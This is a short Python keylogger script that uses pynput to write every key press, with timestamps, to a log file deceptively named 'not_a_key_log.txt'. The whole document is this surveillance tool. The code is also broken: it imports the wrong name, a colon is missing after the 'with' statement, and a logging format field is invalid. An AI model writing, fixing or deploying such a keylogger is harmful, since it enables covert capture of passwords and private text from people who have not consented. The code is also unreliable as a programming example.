from pynput.keyboard import Key, listener
import logging

# Make log
log = ""

# format text for logging (time followed by message)
logging.basicConfig(filename=(log + "not_a_key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(messages)s:')

# simply log the key on press
# this can be updated to only log after a space or enter key
def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener
    listener.join()
